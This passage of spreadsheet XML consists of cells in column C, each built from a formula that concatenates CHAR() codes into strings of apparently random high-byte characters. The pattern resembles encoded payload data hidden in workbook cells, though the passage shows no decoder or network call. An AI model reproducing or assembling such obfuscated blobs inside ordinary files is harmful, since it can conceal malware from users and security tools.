    <row r="262" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C262" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘[¸ôqzˆê‘[</v>
      </c>
    </row>
    <row r="263" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C263" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(234)</f>
        <v>¸ôqzˆê‘[¸ê</v>
      </c>
    </row>
    <row r="264" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C264" t="str">
        <f>CHAR(115)&amp;CHAR(82)&amp;CHAR(157)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(81)&amp;CHAR(146)&amp;CHAR(231)&amp;CHAR(65)&amp;CHAR(127)</f>
        <v>sRê‘Q’çA</v>
      </c>
    </row>
    <row r="265" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C265" t="str">
        <f>CHAR(136)&amp;CHAR(72)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(245)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(153)&amp;CHAR(152)</f>
        <v>ˆH‘[¸õqz™˜</v>
      </c>
    </row>
    <row r="266" spans="3:3" x14ac:dyDescent="0.45">
      <c r="C266" t="str">
        <f>CHAR(144)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(132)&amp;CHAR(123)&amp;CHAR(98)&amp;CHAR(145)&amp;CHAR(153)&amp;CHAR(147)&amp;CHAR(91)</f>
        <v>[¸„{b‘™“[</v>
      </c>
    </row>
    <row r="267" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C267" t="str">
        <f>CHAR(184)&amp;CHAR(254)&amp;CHAR(84)&amp;CHAR(108)&amp;CHAR(158)&amp;CHAR(152)&amp;CHAR(170)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(132)</f>
        <v>¸þTlž˜ª[¸„</v>
      </c>
    </row>
    <row r="268" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C268" t="str">
        <f>CHAR(89)&amp;CHAR(121)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(155)&amp;CHAR(126)&amp;CHAR(174)&amp;CHAR(227)&amp;CHAR(3)&amp;CHAR(59)</f>
        <v>Yyˆê›~®ã_x0003_;</v>
      </c>
    </row>
    <row r="269" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C269" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(225)&amp;CHAR(115)&amp;CHAR(187)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(112)&amp;CHAR(173)&amp;CHAR(252)</f>
        <v>ˆêás»ôqp­ü</v>
      </c>
    </row>
    <row r="270" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C270" t="str">
        <f>CHAR(137)&amp;CHAR(41)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(10)&amp;CHAR(160)&amp;CHAR(233)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‰)ýôq
 é‘[</v>
      </c>
    </row>
    <row r="271" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C271" t="str">
        <f>CHAR(178)&amp;CHAR(209)&amp;CHAR(102)&amp;CHAR(108)&amp;CHAR(250)&amp;CHAR(163)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(200)&amp;CHAR(220)</f>
        <v>²Ñflú£‘[ÈÜ</v>
      </c>
    </row>
    <row r="272" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C272" t="str">
        <f>CHAR(114)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(224)&amp;CHAR(180)&amp;CHAR(76)&amp;CHAR(175)&amp;CHAR(134)&amp;CHAR(62)&amp;CHAR(122)</f>
        <v>rzˆà´L¯†&gt;z</v>
      </c>
    </row>
    <row r="273" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C273" t="str">
        <f>CHAR(136)&amp;CHAR(154)&amp;CHAR(185)&amp;CHAR(88)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(123)&amp;CHAR(95)&amp;CHAR(159)&amp;CHAR(242)</f>
        <v>ˆš¹X¸ô{_Ÿò</v>
      </c>
    </row>
    <row r="274" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C274" t="str">
        <f>CHAR(227)&amp;CHAR(34)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(139)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(81)</f>
        <v>ã"¸ô_x0001_R‹ê‘Q</v>
      </c>
    </row>
    <row r="275" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C275" t="str">
        <f>CHAR(179)&amp;CHAR(220)&amp;CHAR(117)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(236)&amp;CHAR(157)&amp;CHAR(77)&amp;CHAR(181)&amp;CHAR(204)</f>
        <v>³ÜuzˆìMµÌ</v>
      </c>
    </row>
    <row r="276" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C276" t="str">
        <f>CHAR(64)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(153)&amp;CHAR(93)&amp;CHAR(191)&amp;CHAR(253)&amp;CHAR(103)&amp;CHAR(82)</f>
        <v>@zˆê™]¿ýgR</v>
      </c>
    </row>
    <row r="277" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C277" t="str">
        <f>CHAR(140)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(81)&amp;CHAR(144)&amp;CHAR(241)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(130)&amp;CHAR(133)</f>
        <v>Œê‘Qñqz‚…</v>
      </c>
    </row>
    <row r="278" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C278" t="str">
        <f>CHAR(151)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(254)&amp;CHAR(98)&amp;CHAR(126)&amp;CHAR(153)&amp;CHAR(238)&amp;CHAR(150)&amp;CHAR(82)</f>
        <v>—[¸þb~™î–R</v>
      </c>
    </row>
    <row r="279" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C279" t="str">
        <f>CHAR(175)&amp;CHAR(220)&amp;CHAR(117)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(224)&amp;CHAR(150)&amp;CHAR(82)&amp;CHAR(160)&amp;CHAR(220)</f>
        <v>¯Üuzˆà–R Ü</v>
      </c>
    </row>
    <row r="280" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C280" t="str">
        <f>CHAR(117)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(224)&amp;CHAR(185)&amp;CHAR(88)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(119)&amp;CHAR(115)</f>
        <v>uzˆà¹X¸ôws</v>
      </c>
    </row>
    <row r="281" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C281" t="str">
        <f>CHAR(159)&amp;CHAR(178)&amp;CHAR(156)&amp;CHAR(82)&amp;CHAR(160)&amp;CHAR(203)&amp;CHAR(185)&amp;CHAR(133)&amp;CHAR(119)&amp;CHAR(21)</f>
        <v>Ÿ²œR Ë¹…w_x0015_</v>
      </c>
    </row>
    <row r="282" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C282" t="str">
        <f>CHAR(187)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(231)&amp;CHAR(65)&amp;CHAR(126)&amp;CHAR(136)&amp;CHAR(170)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>»[¸çA~ˆª‘[</v>
      </c>
    </row>
    <row r="283" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C283" t="str">
        <f>CHAR(184)&amp;CHAR(246)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(153)&amp;CHAR(232)&amp;CHAR(185)&amp;CHAR(92)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>¸öqz™è¹\¸ô</v>
      </c>
    </row>
    <row r="284" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C284" t="str">
        <f>CHAR(123)&amp;CHAR(112)&amp;CHAR(142)&amp;CHAR(233)&amp;CHAR(254)&amp;CHAR(83)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(123)&amp;CHAR(113)</f>
        <v>{pŽéþS¸ô{q</v>
      </c>
    </row>
    <row r="285" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C285" t="str">
        <f>CHAR(143)&amp;CHAR(238)&amp;CHAR(254)&amp;CHAR(82)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(123)&amp;CHAR(118)&amp;CHAR(142)&amp;CHAR(226)</f>
        <v>îþR¸ô{vŽâ</v>
      </c>
    </row>
    <row r="286" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C286" t="str">
        <f>CHAR(254)&amp;CHAR(81)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(123)&amp;CHAR(21)&amp;CHAR(131)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(81)</f>
        <v>þQ¸ô{_x0015_ƒê‘Q</v>
      </c>
    </row>
    <row r="287" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C287" t="str">
        <f>CHAR(181)&amp;CHAR(227)&amp;CHAR(252)&amp;CHAR(114)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(144)&amp;CHAR(126)&amp;CHAR(174)&amp;CHAR(226)</f>
        <v>µãürˆê~®â</v>
      </c>
    </row>
    <row r="288" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C288" t="str">
        <f>CHAR(252)&amp;CHAR(121)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(144)&amp;CHAR(249)&amp;CHAR(171)&amp;CHAR(240)&amp;CHAR(121)&amp;CHAR(115)</f>
        <v>üyˆêù«ðys</v>
      </c>
    </row>
    <row r="289" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C289" t="str">
        <f>CHAR(153)&amp;CHAR(238)&amp;CHAR(254)&amp;CHAR(87)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(123)&amp;CHAR(92)&amp;CHAR(162)&amp;CHAR(249)</f>
        <v>™îþW¸ô{\¢ù</v>
      </c>
    </row>
    <row r="290" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C290" t="str">
        <f>CHAR(161)&amp;CHAR(88)&amp;CHAR(184)&amp;CHAR(204)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(233)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>¡X¸Ìqzˆé‘[</v>
      </c>
    </row>
    <row r="291" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C291" t="str">
        <f>CHAR(169)&amp;CHAR(135)&amp;CHAR(124)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(224)&amp;CHAR(155)&amp;CHAR(93)&amp;CHAR(215)&amp;CHAR(250)</f>
        <v>©‡|zˆà›]×ú</v>
      </c>
    </row>
    <row r="292" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C292" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(130)&amp;CHAR(152)&amp;CHAR(18)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(132)&amp;CHAR(3)&amp;CHAR(227)</f>
        <v>qz‚˜_x0012_[¸„_x0003_ã</v>
      </c>
    </row>
    <row r="293" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C293" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(225)&amp;CHAR(52)&amp;CHAR(183)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(112)&amp;CHAR(142)&amp;CHAR(153)</f>
        <v>ˆêá4·ôqpŽ™</v>
      </c>
    </row>
    <row r="294" spans="3:3" x14ac:dyDescent="0.45">
      <c r="C294" t="str">
        <f>CHAR(129)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(254)&amp;CHAR(30)&amp;CHAR(107)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(155)&amp;CHAR(93)</f>
        <v>[¸þ_x001E_kˆê›]</v>
      </c>
    </row>
    <row r="295" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C295" t="str">
        <f>CHAR(215)&amp;CHAR(230)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(130)&amp;CHAR(194)&amp;CHAR(130)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(254)</f>
        <v>×æqz‚Â‚[¸þ</v>
      </c>
    </row>
    <row r="296" spans="3:3" x14ac:dyDescent="0.45">
      <c r="C296" t="str">
        <f>CHAR(30)&amp;CHAR(110)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(155)&amp;CHAR(93)&amp;CHAR(146)&amp;CHAR(182)&amp;CHAR(34)&amp;CHAR(48)</f>
        <v>_x001E_nˆê›]’¶"0</v>
      </c>
    </row>
    <row r="297" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C297" t="str">
        <f>CHAR(202)&amp;CHAR(235)&amp;CHAR(145)&amp;CHAR(90)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(230)</f>
        <v>Êë‘Z¸ôqzˆæ</v>
      </c>
    </row>
    <row r="298" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C298" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(130)&amp;CHAR(69)&amp;CHAR(84)&amp;CHAR(184)&amp;CHAR(196)&amp;CHAR(162)&amp;CHAR(107)</f>
        <v>‘[¸‚ET¸Ä¢k</v>
      </c>
    </row>
    <row r="299" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C299" t="str">
        <f>CHAR(139)&amp;CHAR(197)&amp;CHAR(72)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(94)&amp;CHAR(184)&amp;CHAR(152)</f>
        <v>‹ÅHzˆê‘^¸˜</v>
      </c>
    </row>
    <row r="300" spans="3:3" x14ac:dyDescent="0.45">
      <c r="C300" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(18)&amp;CHAR(144)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(215)&amp;CHAR(15)&amp;CHAR(122)</f>
        <v>qzˆ_x0012_[¸×_x000F_z</v>
      </c>
    </row>
    <row r="301" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C301" t="str">
        <f>CHAR(136)&amp;CHAR(142)&amp;CHAR(147)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(148)&amp;CHAR(115)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(201)</f>
        <v>ˆŽ“[¸”szˆÉ</v>
      </c>
    </row>
    <row r="302" spans="3:3" x14ac:dyDescent="0.45">
      <c r="C302" t="str">
        <f>CHAR(194)&amp;CHAR(47)&amp;CHAR(202)&amp;CHAR(157)&amp;CHAR(31)&amp;CHAR(29)&amp;CHAR(251)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>Â/Ê_x001F__x001D_ûê‘[</v>
      </c>
    </row>
    <row r="303" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C303" t="str">
        <f>CHAR(184)&amp;CHAR(48)&amp;CHAR(117)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(78)&amp;CHAR(144)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(215)</f>
        <v>¸0uzˆN[¸×</v>
      </c>
    </row>
    <row r="304" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C304" t="str">
        <f>CHAR(36)&amp;CHAR(41)&amp;CHAR(136)&amp;CHAR(130)&amp;CHAR(151)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(228)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>$)ˆ‚—[¸äqz</v>
      </c>
    </row>
    <row r="305" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C305" t="str">
        <f>CHAR(136)&amp;CHAR(201)&amp;CHAR(214)&amp;CHAR(14)&amp;CHAR(241)&amp;CHAR(176)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(146)</f>
        <v>ˆÉÖ_x000E_ñ°qzˆ’</v>
      </c>
    </row>
    <row r="306" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C306" t="str">
        <f>CHAR(151)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(132)&amp;CHAR(112)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(201)&amp;CHAR(211)&amp;CHAR(55)</f>
        <v>—[¸„pzˆÉÓ7</v>
      </c>
    </row>
    <row r="307" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C307" t="str">
        <f>CHAR(215)&amp;CHAR(150)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(246)</f>
        <v>×–qzˆê‘[¸ö</v>
      </c>
    </row>
    <row r="308" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C308" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(152)&amp;CHAR(173)&amp;CHAR(196)&amp;CHAR(89)&amp;CHAR(176)&amp;CHAR(253)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>qz˜­ÄY°ýqz</v>
      </c>
    </row>
    <row r="309" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C309" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(107)&amp;CHAR(90)&amp;CHAR(139)&amp;CHAR(244)&amp;CHAR(103)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(235)</f>
        <v>ˆêkZ‹ôgzˆë</v>
      </c>
    </row>
    <row r="310" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C310" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(228)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(232)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘[¸äqzˆè‘[</v>
      </c>
    </row>
    <row r="311" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C311" t="str">
        <f>CHAR(184)&amp;CHAR(240)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(233)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(226)</f>
        <v>¸ðqzˆé‘[¸â</v>
      </c>
    </row>
    <row r="312" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C312" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(232)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(245)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>qzˆè‘[¸õqz</v>
      </c>
    </row>
    <row r="313" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C313" t="str">
        <f>CHAR(136)&amp;CHAR(233)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(245)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(235)</f>
        <v>ˆé‘[¸õqzˆë</v>
      </c>
    </row>
    <row r="314" spans="3:3" x14ac:dyDescent="0.45">
      <c r="C314" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(246)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(28)</f>
        <v>‘[¸öqzˆê‘_x001C_</v>
      </c>
    </row>
    <row r="315" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C315" t="str">
        <f>CHAR(186)&amp;CHAR(245)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(93)&amp;CHAR(184)&amp;CHAR(230)</f>
        <v>ºõqzˆê‘]¸æ</v>
      </c>
    </row>
    <row r="316" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C316" t="str">
        <f>CHAR(113)&amp;CHAR(86)&amp;CHAR(136)&amp;CHAR(224)&amp;CHAR(145)&amp;CHAR(29)&amp;CHAR(184)&amp;CHAR(164)&amp;CHAR(113)&amp;CHAR(124)</f>
        <v>qVˆà‘_x001D_¸¤q|</v>
      </c>
    </row>
    <row r="317" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C317" t="str">
        <f>CHAR(136)&amp;CHAR(181)&amp;CHAR(145)&amp;CHAR(61)&amp;CHAR(184)&amp;CHAR(242)&amp;CHAR(113)&amp;CHAR(239)&amp;CHAR(136)&amp;CHAR(116)</f>
        <v>ˆµ‘=¸òqïˆt</v>
      </c>
    </row>
    <row r="318" spans="3:3" x14ac:dyDescent="0.45">
      <c r="C318" t="str">
        <f>CHAR(145)&amp;CHAR(93)&amp;CHAR(184)&amp;CHAR(65)&amp;CHAR(113)&amp;CHAR(28)&amp;CHAR(136)&amp;CHAR(236)&amp;CHAR(145)&amp;CHAR(153)</f>
        <v>‘]¸Aq_x001C_ˆì‘™</v>
      </c>
    </row>
    <row r="319" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C319" t="str">
        <f>CHAR(184)&amp;CHAR(106)&amp;CHAR(113)&amp;CHAR(124)&amp;CHAR(136)&amp;CHAR(61)&amp;CHAR(145)&amp;CHAR(197)&amp;CHAR(184)&amp;CHAR(242)</f>
        <v>¸jq|ˆ=‘Å¸ò</v>
      </c>
    </row>
    <row r="320" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C320" t="str">
        <f>CHAR(113)&amp;CHAR(128)&amp;CHAR(136)&amp;CHAR(140)&amp;CHAR(145)&amp;CHAR(93)&amp;CHAR(184)&amp;CHAR(245)&amp;CHAR(112)&amp;CHAR(228)</f>
        <v>q€ˆŒ‘]¸õpä</v>
      </c>
    </row>
    <row r="321" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C321" t="str">
        <f>CHAR(136)&amp;CHAR(224)&amp;CHAR(145)&amp;CHAR(68)&amp;CHAR(185)&amp;CHAR(164)&amp;CHAR(113)&amp;CHAR(112)&amp;CHAR(136)&amp;CHAR(217)</f>
        <v>ˆà‘D¹¤qpˆÙ</v>
      </c>
    </row>
    <row r="322" spans="3:3" x14ac:dyDescent="0.45">
      <c r="C322" t="str">
        <f>CHAR(144)&amp;CHAR(28)&amp;CHAR(185)&amp;CHAR(254)&amp;CHAR(113)&amp;CHAR(16)&amp;CHAR(137)&amp;CHAR(186)&amp;CHAR(145)&amp;CHAR(81)</f>
        <v>_x001C_¹þq_x0010_‰º‘Q</v>
      </c>
    </row>
    <row r="323" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C323" t="str">
        <f>CHAR(184)&amp;CHAR(137)&amp;CHAR(112)&amp;CHAR(42)&amp;CHAR(136)&amp;CHAR(224)&amp;CHAR(145)&amp;CHAR(202)&amp;CHAR(185)&amp;CHAR(164)</f>
        <v>¸‰p*ˆà‘Ê¹¤</v>
      </c>
    </row>
    <row r="324" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C324" t="str">
        <f>CHAR(113)&amp;CHAR(112)&amp;CHAR(136)&amp;CHAR(82)&amp;CHAR(144)&amp;CHAR(11)&amp;CHAR(184)&amp;CHAR(242)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>qpˆR_x000B_¸òqz</v>
      </c>
    </row>
    <row r="325" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C325" t="str">
        <f>CHAR(138)&amp;CHAR(244)&amp;CHAR(147)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(123)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>Šô“[¸ôq{ˆê</v>
      </c>
    </row>
    <row r="326" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C326" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(245)&amp;CHAR(113)&amp;CHAR(123)&amp;CHAR(136)&amp;CHAR(235)&amp;CHAR(145)&amp;CHAR(75)</f>
        <v>‘[¸õq{ˆë‘K</v>
      </c>
    </row>
    <row r="327" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C327" t="str">
        <f>CHAR(184)&amp;CHAR(254)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(203)&amp;CHAR(145)&amp;CHAR(90)&amp;CHAR(184)&amp;CHAR(245)</f>
        <v>¸þqzˆË‘Z¸õ</v>
      </c>
    </row>
    <row r="328" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C328" t="str">
        <f>CHAR(113)&amp;CHAR(34)&amp;CHAR(168)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(114)&amp;CHAR(105)&amp;CHAR(70)</f>
        <v>q"¨ê‘[¸riF</v>
      </c>
    </row>
    <row r="329" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C329" t="str">
        <f>CHAR(136)&amp;CHAR(235)&amp;CHAR(145)&amp;CHAR(90)&amp;CHAR(184)&amp;CHAR(148)&amp;CHAR(81)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>ˆë‘Z¸”Qzˆê</v>
      </c>
    </row>
    <row r="330" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C330" t="str">
        <f>CHAR(145)&amp;CHAR(205)&amp;CHAR(184)&amp;CHAR(33)&amp;CHAR(112)&amp;CHAR(15)&amp;CHAR(136)&amp;CHAR(235)&amp;CHAR(145)&amp;CHAR(75)</f>
        <v>‘Í¸!p_x000F_ˆë‘K</v>
      </c>
    </row>
    <row r="331" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C331" t="str">
        <f>CHAR(153)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(124)&amp;CHAR(145)&amp;CHAR(129)&amp;CHAR(185)&amp;CHAR(125)</f>
        <v>™ôqzˆ|‘¹}</v>
      </c>
    </row>
    <row r="332" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C332" t="str">
        <f>CHAR(113)&amp;CHAR(123)&amp;CHAR(136)&amp;CHAR(182)&amp;CHAR(176)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(236)</f>
        <v>q{ˆ¶°[¸ôqì</v>
      </c>
    </row>
    <row r="333" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C333" t="str">
        <f>CHAR(136)&amp;CHAR(52)&amp;CHAR(144)&amp;CHAR(198)&amp;CHAR(184)&amp;CHAR(240)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(235)</f>
        <v>ˆ4Æ¸ðqzˆë</v>
      </c>
    </row>
    <row r="334" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C334" t="str">
        <f>CHAR(145)&amp;CHAR(218)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(120)&amp;CHAR(136)&amp;CHAR(101)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘Ú¸ôqxˆe‘[</v>
      </c>
    </row>
    <row r="335" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C335" t="str">
        <f>CHAR(184)&amp;CHAR(247)&amp;CHAR(113)&amp;CHAR(232)&amp;CHAR(136)&amp;CHAR(227)&amp;CHAR(145)&amp;CHAR(103)&amp;CHAR(184)&amp;CHAR(245)</f>
        <v>¸÷qèˆã‘g¸õ</v>
      </c>
    </row>
    <row r="336" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C336" t="str">
        <f>CHAR(113)&amp;CHAR(118)&amp;CHAR(136)&amp;CHAR(214)&amp;CHAR(145)&amp;CHAR(73)&amp;CHAR(184)&amp;CHAR(248)&amp;CHAR(113)&amp;CHAR(56)</f>
        <v>qvˆÖ‘I¸øq8</v>
      </c>
    </row>
    <row r="337" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C337" t="str">
        <f>CHAR(136)&amp;CHAR(242)&amp;CHAR(145)&amp;CHAR(87)&amp;CHAR(184)&amp;CHAR(175)&amp;CHAR(113)&amp;CHAR(101)&amp;CHAR(136)&amp;CHAR(243)</f>
        <v>ˆò‘W¸¯qeˆó</v>
      </c>
    </row>
